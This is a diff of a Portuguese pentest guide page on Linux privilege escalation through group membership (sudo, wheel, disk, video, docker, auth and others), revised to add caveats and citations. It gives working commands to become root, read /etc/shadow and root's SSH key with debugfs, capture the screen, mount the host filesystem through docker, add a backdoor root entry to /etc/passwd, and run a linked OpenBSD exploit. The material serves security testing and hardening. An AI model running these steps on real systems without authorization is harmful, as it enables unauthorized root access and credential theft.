@@ -1,12 +1,10 @@
-# Grupos Interessantes - Linux Privesc
-
-{{#include ../../../banners/hacktricks-training.md}}
+# Grupos Sudo/Admin - Linux Privesc
 
 ## Grupos Sudo/Admin
 
 ### **PE - Method 1**
 
-**Às vezes**, **por padrão (ou porque algum software precisa disso)**, dentro do arquivo **/etc/sudoers**, você pode encontrar algumas destas linhas:
+**Às vezes**, a política **/etc/sudoers** de um sistema (ou um arquivo incluído a partir dela) contém entradas como:<sup>[[3]](#references)</sup>
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -14,28 +12,29 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-Isso significa que **qualquer usuário pertencente ao grupo sudo ou admin pode executar qualquer coisa via sudo**.
+Isso significa que qualquer usuário correspondido por uma das entradas pode executar qualquer comando como qualquer usuário de destino por meio do `sudo` (sujeito ao restante da política).<sup>[[3]](#references)</sup>
 
 Se esse for o caso, para **se tornar root, basta executar**:
 ```
 sudo su
 ```
-### PE - Method 2
+### PE - Método 2
 
 Encontre todos os binários suid e verifique se existe o binário **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Se você descobrir que o binário **pkexec é um binário SUID** e pertence ao grupo **sudo** ou **admin**, provavelmente poderá executar binários como sudo usando `pkexec`.\
-Isso ocorre porque, normalmente, esses são os grupos definidos na **política do polkit**. Essa política basicamente identifica quais grupos podem usar `pkexec`. Verifique com:
+Se **pkexec for um binário SUID**, ele poderá executar um programa como outro usuário somente quando o polkit autorizar a ação solicitada; o bit SUID, por si só, não garante root. Verifique a política instalada e a autorização da sessão-alvo em vez de presumir que a associação aos grupos **sudo** ou **admin** seja suficiente.<sup>[[4]](#references)[[5]](#references)</sup>
+
+Em distribuições que ainda usam o backend Local Authority antigo, inspecione as regras de grupo com:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Lá você encontrará quais grupos têm permissão para executar **pkexec** e, **por padrão**, em algumas distribuições Linux, os grupos **sudo** e **admin** aparecem.
+Os nomes dos grupos relevantes e os padrões variam de acordo com a distribuição; um grupo só é útil aqui se a política local o nomear.<sup>[[5]](#references)</sup>
 
 Para **se tornar root, você pode executar**:
 ```bash
-pkexec "/bin/sh" #You will be prompted for your user password
+pkexec "/bin/sh" #Authentication is required according to the local policy
 ```
 Se você tentar executar **pkexec** e receber este **erro**:
 ```bash
@@ -43,7 +42,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Não é porque você não tem permissões, mas porque não está conectado sem uma GUI**. E há uma solução alternativa para esse problema aqui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Você precisa de **2 sessões ssh diferentes**:<sup>[[1]](#references)</sup>
+Em uma sessão SSH sem um authentication agent registrado, `pkexec` pode falhar com este erro mesmo quando a policy permitiria a ação; a documentação do polkit descreve `pkttyagent` como um text authentication agent para sessões não desktop. O comportamento exato depende da versão e da distribuição, portanto verifique a policy local e a configuração do agent. Uma solução alternativa relatada para versões afetadas do NixOS usa **2 sessões SSH diferentes**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -54,13 +53,13 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-## Grupo wheel
+## Grupo Wheel
 
-**Às vezes**, **por padrão**, dentro do arquivo **/etc/sudoers**, você pode encontrar esta linha:
+Às vezes, uma política do sudoers também pode conter esta entrada:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
-Isso significa que **qualquer usuário que pertença ao grupo wheel pode executar qualquer coisa como sudo**.
+Isso significa que qualquer usuário correspondido pela entrada pode executar qualquer comando como qualquer usuário-alvo por meio do `sudo` (sujeito ao restante da política).<sup>[[3]](#references)</sup>
 
 Se esse for o caso, para **se tornar root, basta executar**:
 ```
@@ -68,23 +67,23 @@ sudo su
 ```
 ## Grupo shadow
 
-Usuários do **grupo shadow** podem **ler** o arquivo **/etc/shadow**:
+Em sistemas cujas permissões concedem esse acesso, usuários no grupo **shadow** podem **ler** **/etc/shadow**; verifique o modo e as ACLs reais no alvo:<sup>[[6]](#references)[[7]](#references)</sup>
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
 Então, leia o arquivo e tente **crackear alguns hashes**.
 
-Uma observação importante sobre o estado de bloqueio ao analisar hashes:
-- Entradas com `!` ou `*` geralmente não permitem logins interativos por senha.
-- `!hash` normalmente significa que uma senha foi definida e depois bloqueada.
-- `*` normalmente significa que nenhum hash de senha válido foi definido.
-Isso é útil para a classificação de contas mesmo quando o login direto está bloqueado.
+Uma observação rápida sobre o estado de bloqueio ao fazer a triagem dos hashes:
+- Entradas com `!` ou `*` geralmente não permitem interação para logins com senha.
+- `!hash` significa que a senha foi bloqueada; os caracteres restantes representam o campo de senha antes do bloqueio.
+- Um campo contendo `*` não é um hash `crypt(3)` válido e impede o login com senha UNIX; não deduza a partir disso se uma senha foi definida anteriormente.
+Isso é útil para a classificação de contas mesmo quando o login direto está bloqueado.<sup>[[6]](#references)</sup>
 
 ## Grupo staff
 
-**staff**: Permite que os usuários adicionem modificações locais ao sistema (`/usr/local`) sem precisar de privilégios de root (observe que os executáveis em `/usr/local/bin` estão na variável PATH de qualquer usuário e podem "substituir" os executáveis em `/bin` e `/usr/bin` com o mesmo nome). Compare com o grupo "adm", que está mais relacionado ao monitoramento/segurança. [\[source\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>
+**staff**: Permite que os usuários adicionem modificações locais ao sistema (`/usr/local`) sem precisar de privilégios de root (observe que os executáveis em `/usr/local/bin` estão na variável PATH de qualquer usuário e podem "substituir" os executáveis em `/bin` e `/usr/bin` com o mesmo nome). Compare com o grupo "adm", que está mais relacionado ao monitoramento/à segurança.<sup>[[2]](#references)[[7]](#references)</sup>
 
-Nas distribuições Debian, a variável `$PATH` mostra que `/usr/local/` será executado com a maior prioridade, independentemente de o usuário ter privilégios ou não.
+Em configurações Debian onde `/usr/local/bin` precede `/usr/bin` em `PATH` (como nos exemplos abaixo), um comando não qualificado resolve primeiro para a cópia em `/usr/local/bin`; confirme o `PATH` efetivo no alvo.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -92,9 +91,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Se pudermos sequestrar alguns programas em `/usr/local`, podemos obter root facilmente.
+Se um processo privilegiado resolver um comando não qualificado por meio de um `/usr/local/bin` com permissão de escrita, substituir esse comando poderá executá-lo com os privilégios do processo; confirme o caminho real e o gatilho antes de testar.
 
-Sequestrar o programa `run-parts` é uma maneira fácil de obter root, porque a maioria dos programas executará um `run-parts` (como o crontab e durante o login via SSH).
+Em sistemas Ubuntu, `pam_motd` executa scripts executáveis por meio de `run-parts --lsbsysinit` como root no login; jobs do cron também podem usar `run-parts`, mas isso depende da distribuição e da configuração.<sup>[[10]](#references)[[11]](#references)</sup>
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -102,7 +101,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-ou quando ocorrer um novo login de sessão SSH.
+Em um novo login SSH, `pspy` pode ajudar a confirmar se esse caminho é realmente invocado no alvo; ele pode observar as linhas de comando dos processos sem root.<sup>[[10]](#references)[[12]](#references)</sup>
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -136,9 +135,9 @@ $ /bin/bash -p
 ```
 ## Grupo disk
 
-Este privilégio é quase **equivalente ao acesso root**, pois você pode acessar todos os dados dentro da máquina.
+A associação ao grupo **disk** pode conceder acesso bruto a dispositivos de bloco e frequentemente está **próxima do acesso root**; a Debian descreve-a como majoritariamente equivalente a root, mas verifique as permissões reais dos dispositivos e o layout de armazenamento no alvo.<sup>[[7]](#references)</sup>
 
-Files:`/dev/sd[a-z][1-9]`
+Os caminhos comuns dos dispositivos incluem `/dev/sd*`, mas NVMe e outros layouts de armazenamento usam nomes diferentes.
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -147,47 +146,50 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Observe que, usando debugfs, você também pode **escrever arquivos**. Por exemplo, para copiar `/tmp/asd1.txt` para `/tmp/asd2.txt`, você pode fazer:
+`debugfs` opera em sistemas de arquivos ext2/ext3/ext4; caminhos como `/root` e `/etc/shadow` acima são arquivos dentro do sistema de arquivos aberto, enquanto o segundo argumento de `dump` é um caminho de saída no sistema de arquivos nativo.<sup>[[8]](#references)</sup> Por exemplo, isto extrai `/tmp/asd1.txt` do sistema de arquivos aberto para `/tmp/asd2.txt` no sistema de arquivos nativo:
 ```bash
-debugfs -w /dev/sda1
+debugfs /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-No entanto, se você tentar **escrever arquivos pertencentes ao root** (como `/etc/shadow` ou `/etc/passwd`), receberá um erro de "**Permission denied**".
+A opção `-w` abre o sistema de arquivos para leitura e escrita, e o comando `write` copia um arquivo nativo para o sistema de arquivos aberto. Evite usá-lo em um sistema de arquivos ativo montado, pois edições diretas podem corromper o sistema de arquivos; trabalhe a partir de uma imagem offline quando possível.<sup>[[8]](#references)</sup>
+```bash
+debugfs -w /dev/sda1
+debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
+```
+## Grupo de Vídeo
 
-## Grupo video
-
-Usando o comando `w`, você pode descobrir **quem está logado no sistema**, e ele exibirá uma saída semelhante à seguinte:
+Usando o comando `w`, você pode descobrir **quem está conectado ao sistema**, e ele exibirá uma saída como a seguinte.<sup>[[20]](#references)</sup>
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-O **tty1** significa que o usuário **yossi está conectado fisicamente** a um terminal na máquina.
+A entrada **tty1** identifica o primeiro console virtual do Linux; por si só, ela não comprova que um usuário esteja fisicamente presente na máquina, especialmente em containers ou outros ambientes.<sup>[[21]](#references)</sup>
 
-O **grupo video** tem acesso para visualizar a saída da tela. Basicamente, você pode observar as telas. Para fazer isso, é necessário **capturar a imagem atual da tela** em dados brutos e obter a resolução usada pela tela. Os dados da tela podem ser salvos em `/dev/fb0`, e você pode encontrar a resolução dessa tela em `/sys/class/graphics/fb0/virtual_size`
+Em sistemas que expõem um dispositivo framebuffer legível, a associação ao grupo **video** pode conceder acesso a esse dispositivo. A interface de framebuffer do Linux documenta `/dev/fb0` como um dispositivo de memória legível que pode ser copiado para obter um snapshot da tela; o caminho `/sys/class/graphics/fb0/virtual_size` está disponível somente onde esse atributo sysfs do fbdev está presente; portanto, verifique o alvo primeiro.<sup>[[7]](#references)[[9]](#references)</sup>
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Para **abrir** a **raw image**, você pode usar o **GIMP**, selecionar o arquivo **`screen.raw`** e escolher **Raw image data** como tipo de arquivo:
+Se a versão instalada do **GIMP** expuser um importador de dados brutos, abra **`screen.raw`** com esse importador; o suporte e os controles variam conforme a versão e o plug-in.<sup>[[22]](#references)</sup>
 
-![Disk Group - Video Group: Para abrir a raw image, você pode usar o GIMP, selecionar o arquivo screen.raw e escolher Raw image data como tipo de arquivo](<../../../images/image (463).png>)
+![Grupo de Disco - Grupo de Vídeo: Para abrir a imagem bruta, você pode usar o GIMP, selecionar o arquivo screen.raw e escolher Raw image data como tipo de arquivo](<../../../images/image (463).png>)
 
-Depois, altere a Width e a Height para os valores usados na tela e verifique os diferentes Image Types (selecione aquele que exibe melhor a tela):
+Defina a largura e a altura da imagem para corresponder à geometria do framebuffer; tente os formatos de pixel/Tipos de imagem disponíveis até que a saída fique legível.<sup>[[9]](#references)</sup>
 
-![Disk Group - Video Group: Depois, altere a Width e a Height para os valores usados na tela e verifique os diferentes Image Types (selecione aquele que exibe melhor a tela)](<../../../images/image (317).png>)
+![Grupo de Disco - Grupo de Vídeo: Em seguida, altere a largura e a altura para os valores usados na tela e verifique diferentes Tipos de imagem (e selecione aquele que exibe melhor a tela)](<../../../images/image (317).png>)
 
 ## Grupo root
 
-Parece que, por padrão, **membros do grupo root** podem ter acesso para **modificar** alguns arquivos de configuração de **serviços**, alguns arquivos de **bibliotecas** ou **outros itens interessantes** que poderiam ser usados para escalar privilégios...
+A associação ao grupo **root** não fornece o UID de root, mas arquivos graváveis pelo grupo e pertencentes a `root` ainda podem ser interessantes quando serviços ou bibliotecas privilegiados os consomem. Verifique as permissões reais do arquivo e como ele é usado antes de considerá-lo um caminho de privilege-escalation.
 
 **Verifique quais arquivos os membros de root podem modificar**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-## Grupo Docker
+## Grupo do Docker
 
-Você pode **montar o sistema de arquivos root da máquina host no volume de uma instância**, fazendo com que, ao iniciar, a instância carregue imediatamente um `chroot` nesse volume. Isso efetivamente concede acesso root à máquina.
+A associação ao grupo `docker` concede acesso em nível de root ao daemon do Docker em instalações padrão com root. Como os bind mounts são somente leitura e gravação por padrão, um usuário que possa controlar esse daemon pode montar o `/` do host em um container e alterar arquivos do host; isso efetivamente concede root no host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
 ```bash
 docker image #Get images from the docker service
 
@@ -197,15 +199,15 @@ docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
 echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
 
 #Ifyou just want filesystem and network access you can startthe following container:
-docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
+docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
 ```
-Finalmente, se você não gostar de nenhuma das sugestões anteriores, ou se elas não estiverem funcionando por algum motivo (docker api firewall?), você sempre pode tentar **executar um container privilegiado e escapar dele**, conforme explicado aqui:
+Finalmente, se você não gostar de nenhuma das sugestões anteriores ou se elas não estiverem funcionando por algum motivo (firewall da Docker API?), você sempre poderá tentar **executar um container privilegiado e escapar dele**, conforme explicado aqui:
 
 {{#ref}}
 ../../containers-namespaces/container-security/
 {{#endref}}
 
-Se você tiver permissões de escrita sobre o docker socket, leia [**este post sobre como escalar privilégios abusando do docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**
+Se você tiver permissões de escrita sobre o socket do Docker, leia [**este post sobre como escalar privilégios abusando do socket do Docker**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**
 
 {{#ref}}
 https://github.com/KrustyHack/docker-privilege-escalation
@@ -223,27 +225,47 @@ https://fosterelli.co/privilege-escalation-via-docker.html
 
 ## Grupo Adm
 
-Normalmente, **members** do grupo **`adm`** têm permissões para **ler arquivos de log** localizados dentro de _/var/log/_.\
-Portanto, se você comprometeu um usuário desse grupo, definitivamente deve **examinar os logs**.
+Normalmente, **membros** do grupo **`adm`** têm permissões para **ler arquivos de log** localizados em _/var/log/_.\
+Portanto, se você comprometeu um usuário dentro desse grupo, definitivamente deverá **examinar os logs**.<sup>[[7]](#references)</sup>
 
 ## Grupos Backup / Operator / lp / Mail
 
-Esses grupos geralmente são vetores de **descoberta de credenciais**, em vez de vetores diretos para root:
-- **backup**: pode expor arquivos compactados com configurações, chaves, dumps de DB ou tokens.
-- **operator**: acesso operacional específico da plataforma que pode causar o leak de dados confidenciais em runtime.
+Esses grupos têm significados específicos de acordo com o serviço e a distribuição. O Debian documenta `backup` para backup/restauração delegados, `lp` para daemons de impressoras e `mail` para `/var/mail`; portanto, verifique as permissões locais antes de tratar a associação como um caminho de privilégio.<sup>[[7]](#references)</sup>
+
+Eles frequentemente são vetores de **descoberta de credenciais**, em vez de vetores diretos para root:
+- **backup**: pode expor arquivos com configurações, chaves, dumps de DB ou tokens.
+- **operator**: acesso operacional específico da plataforma que pode vazar dados confidenciais de runtime.
 - **lp**: filas/spools de impressão podem conter o conteúdo de documentos.
 - **mail**: spools de e-mail podem expor links de redefinição, OTPs e credenciais internas.
 
-Considere a associação a esses grupos uma descoberta de exposição de dados de alto valor e faça pivot por meio da reutilização de senhas/tokens.
+Trate a associação a esses grupos como uma descoberta de exposição de dados de alto valor e faça pivoting por meio da reutilização de senhas/tokens.
 
 ## Grupo Auth
 
-No OpenBSD, o grupo **auth** normalmente pode escrever nas pastas _**/etc/skey**_ e _**/var/db/yubikey**_, caso sejam utilizadas.\
-Essas permissões podem ser abusadas com o exploit a seguir para **escalar privilégios** para root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+No OpenBSD, quando o S/Key está configurado, `/etc/skey` pertence a `root:auth`, e o acesso aos seus registros requer o grupo `auth`; os registros do YubiKey são armazenados em `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Uma configuração vulnerável do OpenBSD 6.6 com S/Key ou YubiKey habilitado permitia que usuários locais com privilégios `auth` se tornassem root; a Qualys documenta o pré-requisito e a cadeia de exploração, e o PoC vinculado a implementa.<sup>[[18]](#references)[[19]](#references)</sup>
 
-## Referências
+## References
 
-- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
+- [1] [autenticação de pkexec/pkttyagent sem uma sessão GUI (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
 - [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
-
+- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
+- [4] [pkexec — Manual de referência do polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
+- [5] [polkit — Manual de referência do polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
+- [6] [shadow(5) — página do manual do Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
+- [7] [Manual de proteção do Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
+- [8] [debugfs(8) — página do manual do Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
+- [9] [O dispositivo Frame Buffer — documentação do Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
+- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
+- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
+- [12] [pspy — snooping de processos Linux sem privilégios](https://github.com/DominicBreuker/pspy)
+- [13] [Segurança do Docker Engine](https://docs.docker.com/engine/security/)
+- [14] [Gerenciar o Docker como usuário não root](https://docs.docker.com/engine/install/linux-postinstall)
+- [15] [Executando containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
+- [16] [skey(5) — páginas do manual do OpenBSD](https://man.openbsd.org/skey.5)
+- [17] [login_yubikey(8) — páginas do manual do OpenBSD](https://man.openbsd.org/login_yubikey.8)
+- [18] [Vulnerabilidades de autenticação no OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
+- [19] [openbsd-authroot — PoC de exploit local](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+- [20] [w(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/w.1.html)
+- [21] [Dispositivos alocados do Linux (versão 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
+- [22] [Importação e exportação de imagens — Documentação do GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
 {{#include ../../../banners/hacktricks-training.md}}
